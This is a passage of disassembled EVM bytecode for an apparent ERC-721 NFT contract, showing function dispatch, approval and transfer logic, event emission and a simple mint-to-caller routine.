0x100 JUMP JUMPDEST DUP1 PUSH4 0x1FFC9A7 EQ PUSH2 0x105 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x135 JUMPI DUP1 PUSH4 0x81812FC EQ PUSH2 0x153 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x183 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x11F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x11A SWAP2 SWAP1 PUSH2 0x198E JUMP JUMPDEST PUSH2 0x333 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13D PUSH2 0x415 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x168 SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x4A7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17A SWAP2 SWAP1 PUSH2 0x1C58 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x198 SWAP2 SWAP1 PUSH2 0x194E JUMP JUMPDEST PUSH2 0x4ED JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1B4 SWAP2 SWAP1 PUSH2 0x1838 JUMP JUMPDEST PUSH2 0x605 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1D0 SWAP2 SWAP1 PUSH2 0x1838 JUMP JUMPDEST PUSH2 0x665 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1F1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1EC SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x685 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FE SWAP2 SWAP1 PUSH2 0x1C58 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x20F PUSH2 0x70C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21C SWAP2 SWAP1 PUSH2 0x1E7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x23A SWAP2 SWAP1 PUSH2 0x17CB JUMP JUMPDEST PUSH2 0x716 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x24C SWAP2 SWAP1 PUSH2 0x1E7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x25D PUSH2 0x7CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x26A SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x27B PUSH2 0x7EA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x288 SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2A6 SWAP2 SWAP1 PUSH2 0x190E JUMP JUMPDEST PUSH2 0x87C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2C7 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2C2 SWAP2 SWAP1 PUSH2 0x188B JUMP JUMPDEST PUSH2 0x892 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2D1 PUSH2 0x8F4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2ED PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2E8 SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x946 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2FA SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x31D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x318 SWAP2 SWAP1 PUSH2 0x17F8 JUMP JUMPDEST PUSH2 0x995 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x32A SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH32 0x80AC58CD00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ DUP1 PUSH2 0x3FE JUMPI POP PUSH32 0x5B5E139F00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ JUMPDEST DUP1 PUSH2 0x40E JUMPI POP PUSH2 0x40D DUP3 PUSH2 0xA29 JUMP JUMPDEST JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH2 0x424 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x450 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x49D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x472 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x49D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x480 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4B2 DUP3 PUSH2 0xA93 JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4F8 DUP3 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x569 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x560 SWAP1 PUSH2 0x1E3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x588 PUSH2 0xADE JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x5B7 JUMPI POP PUSH2 0x5B6 DUP2 PUSH2 0x5B1 PUSH2 0xADE JUMP JUMPDEST PUSH2 0x995 JUMP JUMPDEST JUMPDEST PUSH2 0x5F6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5ED SWAP1 PUSH2 0x1E5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x600 DUP4 DUP4 PUSH2 0xAE6 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x616 PUSH2 0x610 PUSH2 0xADE JUMP JUMPDEST DUP3 PUSH2 0xB9F JUMP JUMPDEST PUSH2 0x655 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x64C SWAP1 PUSH2 0x1CFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x660 DUP4 DUP4 DUP4 PUSH2 0xC34 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x680 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x892 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x691 DUP4 PUSH2 0xF2E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x703 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6FA SWAP1 PUSH2 0x1DFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x787 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x77E SWAP1 PUSH2 0x1DBC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x35 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x24F3 PUSH1 0x35 SWAP2 CODECOPY DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x1 DUP1 SLOAD PUSH2 0x7F9 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x825 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x872 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x847 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x872 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x855 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x88E PUSH2 0x887 PUSH2 0xADE JUMP JUMPDEST DUP4 DUP4 PUSH2 0xF6B JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x8A3 PUSH2 0x89D PUSH2 0xADE JUMP JUMPDEST DUP4 PUSH2 0xB9F JUMP JUMPDEST PUSH2 0x8E2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8D9 SWAP1 PUSH2 0x1CFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x8EE DUP5 DUP5 DUP5 DUP5 PUSH2 0x10D8 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x900 CALLER PUSH1 0x6 SLOAD PUSH2 0x1134 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH32 0xEF1DA42F89C42F48BEFA143007E6F5EFD84A2D1CC3DC97C5EDD2D3373220F66D PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH1 0x1 PUSH1 0x6 SLOAD PUSH2 0x93E SWAP2 SWAP1 PUSH2 0x1F25 JUMP JUMPDEST PUSH1 0x6 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x951 DUP3 PUSH2 0x1152 JUMP JUMPDEST PUSH2 0x990 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x987 SWAP1 PUSH2 0x1E1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x1FFC9A700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA9C DUP2 PUSH2 0x1152 JUMP JUMPDEST PUSH2 0xADB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xAD2 SWAP1 PUSH2 0x1DFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST DUP2 PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB59 DUP4 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xBAB DUP4 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xBED JUMPI POP PUSH2 0xBEC DUP2 DUP6 PUSH2 0x995 JUMP JUMPDEST JUMPDEST DUP1 PUSH2 0xC2B JUMPI POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC13 DUP5 PUSH2 0x4A7 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC54 DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xCAA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xCA1 SWAP1 PUSH2 0x1D3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xD1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD11 SWAP1 PUSH2 0x1D7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xD27 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x1193 JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xD47 DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xD9D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD94 SWAP1 PUSH2 0x1D3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 SSTORE PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0xF29 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12B9 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xFDA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFD1 SWAP1 PUSH2 0x1D9C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x5 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x17307EAB39AB6107E8899845AD3D59BD9653F200F220920489CA2B5937696C31 DUP4 PUSH1 0x40 MLOAD PUSH2 0x10CB SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x10E3 DUP5 DUP5 DUP5 PUSH2 0xC34 JUMP JUMPDEST PUSH2 0x10EF DUP5 DUP5 DUP5 DUP5 PUSH2 0x12BF JUMP JUMPDEST PUSH2 0x112E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1125 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x114E DUP3 DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x1456 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1174 DUP4 PUSH2 0xF2E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 GT ISZERO PUSH2 0x12B3 JUMPI PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1227 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x121F SWAP2 SWAP1 PUSH2 0x1F7B JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x12B2 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 